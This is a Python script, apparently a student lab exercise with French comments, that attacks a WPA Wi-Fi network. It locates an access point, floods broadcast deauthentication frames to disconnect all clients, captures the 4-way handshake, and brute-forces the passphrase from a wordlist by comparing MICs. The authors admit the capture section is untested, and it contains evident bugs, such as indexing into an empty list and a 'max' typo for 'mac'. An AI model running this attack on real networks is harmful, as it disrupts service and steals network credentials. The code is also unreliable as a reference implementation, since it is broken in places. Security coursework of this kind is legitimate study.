from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
import custom

"""
    Nous ne parvenons pas à voir nos réseau wifi mais ceux des voisins seulement...
    
    Par conséquent nous ne pouvons pas tester ce script efficacement et la partie
    de récupération des handshake ne sera pas complète.
"""

DESIRED_SSID = "SWI"
SSID = ""
BSSID = ""

def statusAP(pkt):
    global SSID
    global BSSID
    if pkt.haslayer(Dot11):

        if pkt.type == 0 and pkt.subtype == 8:
            currentSSID = str(pkt.info)
            if currentSSID==DESIRED_SSID:
                SSID = currentSSID
                BSSID = str(pkt.addr3)
                print(SSID + " / " + BSSID)
        else: pass
    else: pass

#on cherche la mac address de l'AP
print("Recherche de l'AP "+ DESIRED_SSID)
sniff(iface="wlp61s0mon",prn=statusAP)

#on veut déconnecter tout le monde
target = "FF:FF:FF:FF:FF:FF" #periph a attaquer

#on forge un packet de deauth
dot11 = Dot11(type=0, subtype=12, addr1=target, addr2=BSSID, addr3=BSSID)
packet = RadioTap()/dot11/Dot11Deauth(reason=7)

#on envoie les paquets de deauth
print("Envois des paquets de deauth...")
sendp(packet, inter=0.1, count=100, iface="wlp61s0mon", verbose=1)
print("Packets deauth envoyés")

#On sniffe pour récuprer les EAPOL
print("Sniffing en cours, appuyez sur CTRL+C pour arrêter")
#thx to : https://stackoverflow.com/questions/9210879/scapy-filtering-with-sniff-function
packets = sniff(filter="ether proto 0x888e", iface="wlp61s0mon", count=100)

wpa = []
#on recupere les paquets
#CETTE PARTIE N'A PAS PU ETRE TESTEE
first = True
attackMac = ""
count = 0

#Nous recherchons les 4 packets de la meme victime
#Vu que c'est un broadcast, il faut prendre les handshake 
#de la meme victime
for p in packets:
    mac = p.addr1.replace(':', '') #on regarde la mac
    if first:
        #on sauvegarde les données du hadnshake 1
        wpa[count]=p
        attackMac = max
        count += 1
    elif mac == attackMac:
        #on trouve les handshake 2,3,4
        wpa[count] = p #handshake N
        count += 1

    #on sort si on a nos 4 paquets
    if count == 4:
        break

#get packets from list
packetHS1 = wpa[0] #handshake 1
packetHS2 = wpa[1] #handshake 2
packetHS4 = wpa[2] #handshake 4

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = SSID
APmac       = a2b_hex(packetHS1.addr2.replace(":", "")) #on recupere la mac de l'ap dans le handshake 1
Clientmac   = a2b_hex(packetHS1.addr1.replace(":", "")) #on recupere la mac du client dans le handshake 1

# Authenticator and Supplicant Nonces
ANonce      = packetHS1.load[13:45] #on trouve le ANonce dans le handshake 1
SNonce      = Dot11Elt(packetHS2).load[65:97] #on trouve le snonce dans le handshake 2

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary

mic_to_test = Dot11Elt(packetHS4).load[129:-2].hex() #on trouve le mic dans le handshake 4

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

#on recupere la data dans le handshake 4 et on remplace le mic du payload par 0
data        = a2b_hex(Dot11Elt(packetHS4).load[48:].hex().replace(mic_to_test, "0"*len(mic_to_test))) #cf "Quelques détails importants" dans la donnée

ssid = str.encode(ssid)

fileWords = open("wordslist.txt", "r")

for word in fileWords.readlines():
    cleanWord = word.strip()#on nettoie le mot sinon \n fais encore partie du mot

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(cleanWord) 
    
    pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = custom.customPRF512(pmk,str.encode(A),B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)

    #on vérifie sir les deux mic sont egaux
    if mic.hexdigest()[:-8] == mic_to_test:
        print ("Correct passphrase : " + cleanWord)
        print ("\nResults of the key expansion")
        print ("=============================")
        print ("PMK:\t\t",pmk.hex(),"\n")
        print ("PTK:\t\t",ptk.hex(),"\n")
        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
        print ("TK:\t\t",ptk[32:48].hex(),"\n")
        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
        print ("MIC:\t\t",mic.hexdigest(),"\n")
        exit()
    else:
        print("Wrong passphrase : " + cleanWord)

#si on arrive ici c'est qu'aucune passphrase n'est correcte
print("No correct passphrases found")